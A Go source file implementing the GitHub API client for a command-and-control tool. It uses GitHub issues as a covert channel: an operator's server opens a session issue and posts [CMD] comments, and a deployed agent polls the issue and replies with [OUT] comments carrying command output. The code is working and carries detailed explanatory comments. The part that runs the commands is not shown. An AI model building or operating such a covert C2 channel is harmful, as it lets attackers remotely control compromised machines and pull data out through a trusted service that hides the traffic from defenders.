package ghapi

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

const baseURL = "https://api.github.com"

// Client wraps the GitHub REST API for C2 communication.
type Client struct {
	Token      string
	Owner      string
	Repo       string
	HTTPClient *http.Client
}

// NewClient creates a new GitHub API client.
func NewClient(token, owner, repo string) *Client {
	return &Client{
		Token: token,
		Owner: owner,
		Repo:  repo,
		// CheckRedirect: nil means the default behavior — follow up to 10 redirects.
		// GitHub can 301 if a repo was renamed/transferred, so we want this.
		HTTPClient: &http.Client{},
	}
}

// Issue represents the parsed GitHub issue.
// The backticks in `json:"id"` are struct tags — they map JSON keys to fields.
type Issue struct {
	ID       int64  `json:"id"`
	Number   int    `json:"number"`
	Title    string `json:"title"`
	Body     string `json:"body"`
	State    string `json:"state"`
	Comments int    `json:"comments"`
}

// Comment represents a single parsed comment on a GitHub issue.
// The server posts [CMD] comments; the agent posts [OUT] comments.
//
// GitHub assigns comment IDs globally (not per-issue), so they are large
// integers (e.g. 6278798824). int64 is required — int32 would overflow.
type Comment struct {
	ID   int64    `json:"id"`
	Body string   `json:"body"`
	User struct { // anon struct because JSON format has nested object
		Login string `json:"login"`
	} `json:"user"`
	CreatedAt string `json:"created_at"`
}

// do is the shared HTTP helper that attaches auth headers and handles errors.
func (c *Client) do(method, path string, payload interface{}) ([]byte, error) {
	var reqBody io.Reader

	// comment body turned to bytes
	if payload != nil {
		data, err := json.Marshal(payload)
		if err != nil {
			return nil, fmt.Errorf("marshaling request body: %w", err)
		}
		reqBody = bytes.NewReader(data)
	}

	// build request
	req, err := http.NewRequest(method, baseURL+path, reqBody)
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	// setting auth headers — equivalent to curl's -H flags
	// X-GitHub-Api-Version is required by the GitHub REST API (private repos will
	// return 404 without it even with a valid token).
	req.Header.Set("Authorization", "Bearer "+c.Token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("X-GitHub-Api-Version", "2026-03-10")
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.HTTPClient.Do(req) // send request, block until reply
	if err != nil {
		return nil, fmt.Errorf("executing request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response body: %w", err)
	}

	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("GitHub API error %d: %s", resp.StatusCode, string(body))
	}

	return body, nil
}

// CreateIssue opens a new issue to represent a fresh C2 session.
//
// Called from: server/server.go → StartSession()
//
// The SERVER always creates issues — it is the operator initiating a session.
// The AGENT never creates issues; it polls for open ones and picks them up.
// API path: POST /repos/{owner}/{repo}/issues
func (c *Client) CreateIssue(title, body string) (*Issue, error) {
	path := fmt.Sprintf("/repos/%s/%s/issues", c.Owner, c.Repo)
	payload := map[string]string{"title": title, "body": body}

	data, err := c.do("POST", path, payload)
	if err != nil {
		return nil, err
	}

	var issue Issue // creates an empty issue in memory to fill with JSON data
	if err := json.Unmarshal(data, &issue); err != nil {
		return nil, fmt.Errorf("parsing issue response: %w", err)
	}
	return &issue, nil
}

// GetIssue retrieves metadata for a specific issue number.
func (c *Client) GetIssue(number int) (*Issue, error) {
	path := fmt.Sprintf("/repos/%s/%s/issues/%d", c.Owner, c.Repo, number)

	data, err := c.do("GET", path, nil)
	if err != nil {
		return nil, err
	}

	var issue Issue
	if err := json.Unmarshal(data, &issue); err != nil {
		return nil, fmt.Errorf("parsing issue response: %w", err)
	}
	return &issue, nil
}

// PostComment adds a comment to an issue thread.
// The server uses this to post [CMD] messages; the agent uses it for [OUT] replies.
//
// Called from: server/server.go → repl()
//
// API path: POST /repos/{owner}/{repo}/issues/{issue_number}/comments
// Note: the web URL format (issues/1#issuecomment-XXXXXXX) is a browser anchor
// used by GitHub's UI — the REST API uses the /comments path, not the # anchor.
func (c *Client) PostComment(issueNumber int, body string) (*Comment, error) {
	path := fmt.Sprintf("/repos/%s/%s/issues/%d/comments", c.Owner, c.Repo, issueNumber)
	payload := map[string]string{"body": body}

	data, err := c.do("POST", path, payload)
	if err != nil {
		return nil, err
	}

	var comment Comment
	if err := json.Unmarshal(data, &comment); err != nil {
		return nil, fmt.Errorf("parsing comment response: %w", err)
	}
	return &comment, nil
}

// GetComments retrieves all comments on an issue thread in chronological order.
//
// Called from: server/server.go → pollForResponse()
//
// API path: GET /repos/{owner}/{repo}/issues/{issue_number}/comments
// Returns comments sorted oldest→newest. We find new agent replies by comparing
// comment IDs: any comment with ID > the [CMD] comment ID came after the command.
// GitHub comment IDs are globally unique and non-sequential per issue
// (e.g. 6278798824). We use ID comparison (c.ID > afterID) to find new ones.
func (c *Client) GetComments(issueNumber int) ([]Comment, error) {
	path := fmt.Sprintf("/repos/%s/%s/issues/%d/comments", c.Owner, c.Repo, issueNumber)

	data, err := c.do("GET", path, nil)
	if err != nil {
		return nil, err
	}

	var comments []Comment
	if err := json.Unmarshal(data, &comments); err != nil {
		return nil, fmt.Errorf("parsing comments response: %w", err)
	}
	return comments, nil
}
